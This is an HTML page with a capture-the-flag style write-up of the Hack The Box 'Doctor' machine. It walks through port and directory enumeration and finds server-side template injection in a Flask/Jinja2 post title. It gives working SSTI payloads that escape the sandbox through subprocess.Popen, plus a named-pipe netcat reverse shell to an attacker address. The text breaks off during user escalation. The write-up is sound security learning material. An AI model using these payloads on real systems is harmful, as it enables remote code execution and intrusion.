@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Doctor machine - Kebir Moundir Chemseddine</title><meta name="Description" content="This article shows soultion of doctor-machine."><meta property="og:title" content="Doctor machine" />
+<meta property="og:description" content="This article shows soultion of doctor-machine." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mondirkb.github.io/wiretups/doctor-machine/" />
+<meta property="og:image" content="https://mondirkb.github.io/wiretups/doctor-machine/featured-image.jpg"/>
+<meta property="article:published_time" content="2020-12-01T21:57:40+08:00" />
+<meta property="article:modified_time" content="2020-01-01T16:45:40+08:00" /><meta property="og:site_name" content="KEBIR MOUNDIR CHEMSEDDINE" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mondirkb.github.io/wiretups/doctor-machine/featured-image.jpg"/>
+<meta name="twitter:title" content="Doctor machine"/>
+<meta name="twitter:description" content="This article shows soultion of doctor-machine."/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mondirkb.github.io/wiretups/doctor-machine/" /><link rel="next" href="https://mondirkb.github.io/wiretups/alfred-machine/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Doctor machine",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mondirkb.github.io\/wiretups\/doctor-machine\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/mondirkb.github.io\/wiretups\/doctor-machine\/featured-image.jpg",
+                            "width":  2400 ,
+                            "height":  1350 
+                        }],"genre": "posts","keywords": "Hackthebox","wordcount":  2494 ,
+        "url": "https:\/\/mondirkb.github.io\/wiretups\/doctor-machine\/","datePublished": "2020-12-01T21:57:40+08:00","dateModified": "2020-01-01T16:45:40+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "moundir"
+            },"description": "This article shows soultion of doctor-machine."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Kebir Moundir Chemseddine"><span class="header-title-pre">>$ echo</span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/wiretups/"> Wiretups </a><a class="menu-item" href="/#/Projects/"> Projects </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Kebir Moundir Chemseddine"><span class="header-title-pre">>$ echo</span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/wiretups/" title="">Wiretups</a><a class="menu-item" href="/#/Projects/" title="">Projects</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Doctor machine</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dillonzq.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>moundir</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-12-01">2020-12-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2494 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#examine-port-80---apache-server">Examine Port 80 - Apache server</a></li>
+        <li><a href="#splunk">Splunk</a></li>
+        <li><a href="#examine-port-8089---splunk">Examine Port 8089 - Splunk</a></li>
+        <li><a href="#back-to-port-80---apache-server">Back to Port 80 - Apache Server</a></li>
+        <li><a href="#doctorshtb-website">doctors.htb website</a></li>
+        <li><a href="#testing-77">Testing ${7*7}</a></li>
+        <li><a href="#testing-77-1">Testing {{7*7}}</a></li>
+        <li><a href="#testing-77-2">Testing {{7*&lsquo;7&rsquo;}}</a></li>
+        <li><a href="#testing-config">Testing {{config}}</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploiting-jinja2">Exploiting Jinja2</a>
+      <ul>
+        <li><a href="#inject-from-config-subclass-and-the-true-impact-of-ssti">Inject from config subclass and the true impact of SSTI</a></li>
+        <li><a href="#background-info">Background info</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#gain-access-to-user">Gain Access to User</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>TODO: ADD [Linux, Enumeratin, SSTI, Splunk]</p>
+<h1 id="doctor-linux">Doctor (Linux)</h1>
+<figure><a class="lightgallery" href="/posts/doctor-machine/pics/logo.png" title="/posts/doctor-machine/pics/logo.png" data-thumbnail="/posts/doctor-machine/pics/logo.png" data-sub-html="<h2>doctor-machine</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/doctor-machine/pics/logo.png"
+            data-srcset="/posts/doctor-machine/pics/logo.png, /posts/doctor-machine/pics/logo.png 1.5x, /posts/doctor-machine/pics/logo.png 2x"
+            data-sizes="auto"
+            alt="/posts/doctor-machine/pics/logo.png" />
+    </a><figcaption class="image-caption">doctor-machine</figcaption>
+    </figure>
+<h2 id="enumeration">Enumeration</h2>
+<pre><code>rustscan --ulimit 5000 10.129.2.21 -- -sV -o port_scan
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="examine-port-80---apache-server">Examine Port 80 - Apache server</h3>
+<p>Accessing Port 80 via the browser, reveals a website which contains information regarding services and contacts of several doctors.</p>
+<p>Let&rsquo;s run gobuster in the background while we manually explore the website. It would be interesting to find out if it is some kind of CMS such as Wordpress of if it was developed with something different.</p>
+<p>Taking a look at the <code>colorlib</code> theme, we see it&rsquo;s definitely intended to be used in a WordPress environment.</p>
+<figure>
+    <img src="/posts/doctor-machine/pics/colorlib.png"/> 
+</figure>
+
+<p>However, if we try to access the common WordPress directories such as <code>wp-admin</code>, we get a HTTP Error 404. So let&rsquo;s wait for gobuster to finish and see if it has found any interesting files/directories.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">└──╼ $ gobuster dir -u <span class="s2">&#34;10.129.2.21&#34;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php                                                                          
+<span class="o">===============================================================</span>                                                                                                                           
+Gobuster v3.0.1                                                                                                                                                                           
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>                                                                                                                           
+<span class="o">===============================================================</span>                                                                                                                           
+<span class="o">[</span>+<span class="o">]</span> Url:            http://10.129.2.21                                                                                                                                                    
+<span class="o">[</span>+<span class="o">]</span> Threads:        <span class="m">10</span>                                                                                                                                                                    
+<span class="o">[</span>+<span class="o">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                          
+<span class="o">[</span>+<span class="o">]</span> Status codes:   200,204,301,302,307,401,403                                                                                                                                           
+<span class="o">[</span>+<span class="o">]</span> User Agent:     gobuster/3.0.1                                                                                                                                                        
+<span class="o">[</span>+<span class="o">]</span> Extensions:     html,php                                                                                                                                                              
+<span class="o">[</span>+<span class="o">]</span> Timeout:        <span class="nv">10s</span>                                                                                                                                                                   
+<span class="o">===============================================================</span>                                                                                                                           
+2021/01/20 08:48:43 Starting <span class="nv">gobuster</span>                                                                                                                                                     
+<span class="o">===============================================================</span>                                                                                                                           
+/index.html <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                                 
+/images <span class="o">(</span>Status: 301<span class="o">)</span>                                                                                                                                                                     
+/contact.html <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                               
+/about.html <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                                 
+/blog.html <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                                  
+/services.html <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                              
+/css <span class="o">(</span>Status: 301<span class="o">)</span>                                                                                                                                                                        
+/js <span class="o">(</span>Status: 301<span class="o">)</span>                                                                                                                                                                         
+/departments.html <span class="o">(</span>Status: 200<span class="o">)</span>                                                                                                                                                           
+/fonts <span class="o">(</span>Status: 301<span class="o">)</span>                                                                                                                                                                      
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>   
+</code></pre></div><p>This does not look like Wordpress.</p>
+<p>After checking each of the directories and the included files I was pretty stuck. I reran the port scan and facepalmed. My first scan did not discover one of the open ports:</p>
+<pre><code>PORT     STATE SERVICE  REASON  VERSION
+22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http     syn-ack Apache httpd 2.4.41 ((Ubuntu))
+8089/tcp open  ssl/http syn-ack Splunkd httpd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>The machine also has an open Port 8089, which is running a Splunk service.</p>
+<h3 id="splunk">Splunk</h3>
+<p><em>Splunk is a data aggregation and search tool often used as a Security Information and Event Monitoring (SIEM) system. Splunk Enterprise Server is a web application which runs on a server, with agents, called Universal Forwarders, which are installed on every system in the network. Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 when Splunk required any new installations to set a password of 8 characters or higher.</em> (<a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a>)</p>
+<h3 id="examine-port-8089---splunk">Examine Port 8089 - Splunk</h3>
+<figure>
+    <img src="/posts/doctor-machine/pics//splunk.png"/> 
+</figure>
+
+<p>Trying some exploits such as <a href="https://www.exploit-db.com/exploits/18245">https://www.exploit-db.com/exploits/18245</a> failed. Also, the default credentials <code>admin:changeme</code> did not work, when trying to access the services. Without spending too much time on this, I went back to enumeration on Port 80.</p>
+<h3 id="back-to-port-80---apache-server">Back to Port 80 - Apache Server</h3>
+<p>After going through the wepages again, I saw an email address of the doctor <code>info@doctors.htb</code>. Then it hit me: What if I&rsquo;ve been looking on the wrong domain for all that time? I quickly added doctors.htb to my hosts file and accessed the website again. ANOTHER BIG FACEPALM! A login page!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/wiretups/doctor-machine/pics/login_page.png"
+        data-srcset="/wiretups/doctor-machine/pics/login_page.png, /wiretups/doctor-machine/pics/login_page.png 1.5x, /wiretups/doctor-machine/pics/login_page.png 2x"
+        data-sizes="auto"
+        alt="/wiretups/doctor-machine/pics/login_page.png"
+        title="/wiretups/doctor-machine/pics/login_page.png" width="1193" height="609" /></p>
+<h3 id="doctorshtb-website">doctors.htb website</h3>
+<p>The web application allows us to create our own user and then log in with this freshly created user.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/wiretups/doctor-machine/pics/logged_in.png"
+        data-srcset="/wiretups/doctor-machine/pics/logged_in.png, /wiretups/doctor-machine/pics/logged_in.png 1.5x, /wiretups/doctor-machine/pics/logged_in.png 2x"
+        data-sizes="auto"
+        alt="/wiretups/doctor-machine/pics/logged_in.png"
+        title="/wiretups/doctor-machine/pics/logged_in.png" width="1179" height="386" /></p>
+<p>Here, we have several possibilities.</p>
+<ol>
+<li>View and update our account - nothing suspicious there</li>
+<li>Logout - obviously not suspicious as well</li>
+<li>Create New Posts</li>
+</ol>
+<p>As we know from the original doctor web application, there was a user called &ldquo;Admin&rdquo; that posted some Blog articles. Let&rsquo;s see if we can figure something out:</p>
+<p>When creating a new post, it asks us for a title and some content. Afterwards, a nice post gets generated and we can view it on our posts list.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/wiretups/doctor-machine/pics/posts_test.png"
+        data-srcset="/wiretups/doctor-machine/pics/posts_test.png, /wiretups/doctor-machine/pics/posts_test.png 1.5x, /wiretups/doctor-machine/pics/posts_test.png 2x"
+        data-sizes="auto"
+        alt="/wiretups/doctor-machine/pics/posts_test.png"
+        title="/wiretups/doctor-machine/pics/posts_test.png" width="1279" height="451" /></p>
+<p>My first idea was to enumerate for users in the url, as a directory was created for my username <code>babbadeckl</code>. But we can also try the admin user, as we know that he/she published some posts.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/wiretups/doctor-machine/pics/admin_post.png"
+        data-srcset="/wiretups/doctor-machine/pics/admin_post.png, /wiretups/doctor-machine/pics/admin_post.png 1.5x, /wiretups/doctor-machine/pics/admin_post.png 2x"
+        data-sizes="auto"
+        alt="/wiretups/doctor-machine/pics/admin_post.png"
+        title="/wiretups/doctor-machine/pics/admin_post.png" width="1272" height="439" /></p>
+<p>However, the post did not reveal any helpful information.</p>
+<p>Then I remebered a similar challenge which I solved during a CTF a few weeks earlier. The task was to steal the Admin cookie to then impersonate his/her account. The assumption here is, of course, that the admin user will open/look at the posts that I generate. So&hellip; I tried to somehow find that XSS vulnerability&hellip; But apparently that&rsquo;s not the correct way for this challenge.</p>
+<p>After several hours of reaching dead ends, I discovered a directory called <code>archive</code>. At first glance it&rsquo;s simply a blank website, but opening the source code it reveals an HTML item:</p>
+<pre><code>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;rss version=&quot;2.0&quot;&gt;
+&lt;channel&gt;
+&lt;title&gt;Archive&lt;/title&gt;
+&lt;item&gt;&lt;title&gt;test&lt;/title&gt;&lt;/item&gt;
+
+        &lt;/channel&gt;
+</code></pre><p>It contained an item with a title element set to <code>test</code> &hellip; hmm is that the title from our post? I went back to creating a post with the title <code>1234</code>. When reloading the archive source code the item title changed to <code>1234</code>. So I was able to control that! That seems suspicious.</p>
+<p>I immediately thought of some kind of injection vulnerability. What is it? Command Injection? Some language in the background that&rsquo;s interpreting my input? Then I remebered a security lab from my university in which we talked about Modern Web Application Exploitation. The big topic there was Sever Side Template Injection (SSTI). I tried the basic payloads and indeed! It&rsquo;s vulnerable to SSTI. I will quickly show you how you can test for SSTI and then identify the underlying template engine.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/wiretups/doctor-machine/pics/ssti_identifcation.png"
+        data-srcset="/wiretups/doctor-machine/pics/ssti_identifcation.png, /wiretups/doctor-machine/pics/ssti_identifcation.png 1.5x, /wiretups/doctor-machine/pics/ssti_identifcation.png 2x"
+        data-sizes="auto"
+        alt="/wiretups/doctor-machine/pics/ssti_identifcation.png"
+        title="/wiretups/doctor-machine/pics/ssti_identifcation.png" width="645" height="387" /></p>
+<p>We simply follow the identification graph in the picture above.</p>
+<h3 id="testing-77">Testing ${7*7}</h3>
+<pre><code>POST /post/2/update HTTP/1.1
+...
+title=${7*7}&amp;content=test&amp;submit=Post
+</code></pre><p>Check archive:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;rss version=&quot;2.0&quot;&gt;
+&lt;channel&gt;
+&lt;title&gt;Archive&lt;/title&gt;
+&lt;item&gt;&lt;title&gt;${7+7}&lt;/title&gt;&lt;/item&gt;
+
+        &lt;/channel&gt;
+</code></pre><p>Hmm&hellip; No code execution. So we follow the red arrow to <code>{{7*7}}</code>.</p>
+<h3 id="testing-77-1">Testing {{7*7}}</h3>
+<pre><code>POST /post/2/update HTTP/1.1
+...
+title={{7*7}}&amp;content=test&amp;submit=Post
+</code></pre><p>Check archive:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;rss version=&quot;2.0&quot;&gt;
+&lt;channel&gt;
+&lt;title&gt;Archive&lt;/title&gt;
+&lt;item&gt;&lt;title&gt;49&lt;/title&gt;&lt;/item&gt;
+
+        &lt;/channel&gt;
+</code></pre><p>The title is <code>49</code>! Amazing. Now we only have to find out wheather it&rsquo;s Twig or Jinja2.</p>
+<p>The main difference between those two template engines is that Twig has more similarities to Javascript when it comes to certain operations, while Jinja2 is similar to Python.</p>
+<p>E.g: <code>{{7*'7'}}</code> will result in <code>49</code> for Twig and <code>7777777</code> for Jinja2. Let&rsquo;s test for that payload!</p>
+<h3 id="testing-77-2">Testing {{7*&lsquo;7&rsquo;}}</h3>
+<pre><code>POST /post/2/update HTTP/1.1
+...
+title={{7*'7'}}&amp;content=test&amp;submit=Post
+</code></pre><p>Check archive:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;rss version=&quot;2.0&quot;&gt;
+&lt;channel&gt;
+&lt;title&gt;Archive&lt;/title&gt;
+&lt;item&gt;&lt;title&gt;7777777&lt;/title&gt;&lt;/item&gt;
+
+        &lt;/channel&gt;	
+</code></pre><p>All our findings strongly hint towards Jinja2. So the last step is to now try some Jinja specific commands like <code>{{config}}</code>, which is a dictionary-like object that contains all of the configuration values for the application. In most cases, this includes sensitive values such as database connection strings, credentials to third party services, the SECRET_KEY, etc.</p>
+<h3 id="testing-config">Testing {{config}}</h3>
+<pre><code>POST /post/2/update HTTP/1.1
+...
+title={{config}}&amp;content=test&amp;submit=Post
+
+</code></pre><p>Check archive:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;rss version=&quot;2.0&quot;&gt;
+&lt;channel&gt;
+&lt;title&gt;Archive&lt;/title&gt;
+&lt;item&gt;&lt;title&gt;&amp;lt;Config { hundreds of variables}
+</code></pre><p>So now we definitely know that this must be Jinja2! Let&rsquo;s see how we can exploit this to gain more information or even system access!</p>
+<h2 id="exploiting-jinja2">Exploiting Jinja2</h2>
+<p><em>Credits to <code>IndominusByte</code> for the great article about SSTI (<a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee</a>)</em></p>
+<p>The config object contains all of the configuration values AFTER they have been resolved by the framework.
+Our most interesting discovery also comes from introspecting the config object. While the config object is dictionary-like, it is a subclass that contains several unique methods: <code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code>, and <code>root_path</code>.</p>
+<h3 id="inject-from-config-subclass-and-the-true-impact-of-ssti">Inject from config subclass and the true impact of SSTI</h3>
+<p>The from_object method then adds all attributes of the newly loaded module whose variable name is all uppercase to the config object. The interesting thing about this is that attributes added to the config object maintain their type, which means functions added to the config object can be called from the template context via the config object. To demonstrate this, inject <code>{{ config.items() }}</code> into the SSTI vulnerability and note the current configuration entries.</p>
+<p>Then inject <code>{{ config.from_object(‘os’) }}</code>. This will add to the config object all attributes of the os library whose variable names are all uppercase. Inject <code>{{ config.items() }}</code> again and notice the new configuration items. Also, notice the types of these configuration items.</p>
+<p>Any callable items added to the config object can now be called through the SSTI vulnerability. The next step is finding functionality within the available importable modules that can be manipulated to break out of the template sandbox.</p>
+<h3 id="background-info">Background info</h3>
+<p>The MRO in <code>__mro__</code> stands for Method Resolution Order, and is defined as, “a tuple of classes that are considered when looking for base classes during method resolution.” The <code>__mro__</code> attribute consists of the object’s inheritance map in a tuple consisting of the class, its base, its base’s base, and so on up to object (if using new-style classes).</p>
+<p>The <code>__subclasses__</code> attribute is defined as a method that “keeps a list of weak references to its immediate subclasses.” for each new-style class, and “returns a list of all those references still alive.”
+Greatly simplified, <code>__mro__</code> allows us to go back up the tree of inherited objects in the current Python environment, and <code>__subclasses__</code> lets us come back down. So what’s the impact on the search for a greater exploit for SSTI in Flask/Jinja2? By starting with a new-type object, e.g. type str, we can crawl up the inheritance tree to the root object class using <code>__mro__</code>, then crawl back down to every new-style object in the Python environment using <code>__subclasses__</code>. With that, we can access every class loaded in the current python environment!</p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>The first thing we want to do it is to select a new-style object to use for accessing the object base class. We can simply use ‘ ‘, a blank string, object type str or any other Python object such as Integer (e.g. 1) or Bool (e.g True). Then, we can use the <code>__mro__</code> attribute to access the object’s inherited classes. Inject {{ ‘’.<strong>class</strong>.<strong>mro</strong> }} as a payload into the SSTI vulnerability.</p>
+<p>Now check the archive again!</p>
+<pre><code>(&lt;class 'str'&gt;, &lt;class 'object'&gt;)
+</code></pre><p>Perfect! Now we can to access the object class element. So we simply append <code>[1]</code> to our payload, to access the element at index 1. Furthermore, we add <code>__subclasses__()</code>, to then see all the subclasses of the root object.</p>
+<pre><code>title={{''.__class__.__mro__[1].__subclasses__()}}&amp;content=test&amp;submit=Post
+</code></pre><p>In the archive, we can now see a huge list of available classes. Now we have to figure out which one can be used to create a reverse shell.</p>
+<p>Going through the available classes we see <code>subprocess.Popen</code>. This is the perfect class for our purposes!</p>
+<p>Now we only have to figure out the exact index of the class. We can use python slicing for that.</p>
+<p>e.g try;:</p>
+<pre><code>title={{''.__class__.__mro__[1].__subclasses__()[200:]}}
+</code></pre><p>And repeat that until subprocess.Popen is the very first element in the list. Then you know the index of the class.</p>
+<p>Afterwards you can do following:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Make sure the file /tmp/f does not exist</span>
+<span class="nv">title</span><span class="o">={{</span><span class="s1">&#39;&#39;</span>.__class__.__mro__<span class="o">[</span>1<span class="o">]</span>.__subclasses__<span class="o">()[</span>407<span class="o">](</span><span class="s1">&#39;rm /tmp/f&#39;</span>, <span class="nv">shell</span><span class="o">=</span>True, <span class="nv">stdout</span><span class="o">=</span>-1<span class="o">)</span>.communicate<span class="o">()}}</span><span class="p">&amp;</span><span class="nv">content</span><span class="o">=</span>test<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span>Post
+
+<span class="c1"># Create the file and make it a filesystem node</span>
+<span class="nv">title</span><span class="o">={{</span><span class="s1">&#39;&#39;</span>.__class__.__mro__<span class="o">[</span>1<span class="o">]</span>.__subclasses__<span class="o">()[</span>407<span class="o">](</span><span class="s1">&#39;mknod /tmp/f p&#39;</span>, <span class="nv">shell</span><span class="o">=</span>True, <span class="nv">stdout</span><span class="o">=</span>-1<span class="o">)</span>.communicate<span class="o">()}}</span><span class="p">&amp;</span><span class="nv">content</span><span class="o">=</span>test<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span>Post
+
+<span class="c1"># Create Reverse shell</span>
+<span class="nv">title</span><span class="o">={{</span><span class="s1">&#39;&#39;</span>.__class__.__mro__<span class="o">[</span>1<span class="o">]</span>.__subclasses__<span class="o">()[</span>407<span class="o">](</span><span class="s1">&#39;/bin/sh 0&lt;/tmp/f | nc 10.10.14.26 4444 1&gt;/tmp/f&#39;</span>, <span class="nv">shell</span><span class="o">=</span>True, <span class="nv">stdout</span><span class="o">=</span>-1<span class="o">)</span>.communicate<span class="o">()}}</span><span class="p">&amp;</span><span class="nv">content</span><span class="o">=</span>test<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span>Post
+</code></pre></div><p>And we receive our shell!</p>
+<pre><code>web@doctor:~$ id
+uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+</code></pre><h2 id="gain-access-to-user">Gain Access to User</h2>
+<p>This one took me several hours. First I checked all the common privilege escalation techniques, but none of them was successful.</p>
+<p>After that, I tried to somehow abuse the flask application to which we have access to. We can modify the source code and even restart the application. I realized that additional to the <code>/reset_password</code> route, also a <code>/reset_password/token</code> route exists.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@users.route</span><span class="p">(</span><span class="s2">&#34;/reset_password/&lt;token&gt;&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">reset_token</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">current_user</span><span class="o">.</span><span class="n">is_authenticated</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;main.home&#39;</span><span class="p">))</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">verify_reset_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+    
+    <span class="n">form</span> <span class="o">=</span> <span class="n">ResetPasswordForm</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">form</span><span class="o">.</span><span class="n">validate_on_submit</span><span class="p">():</span>
+        <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">generate_password_hash</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">deco</span>
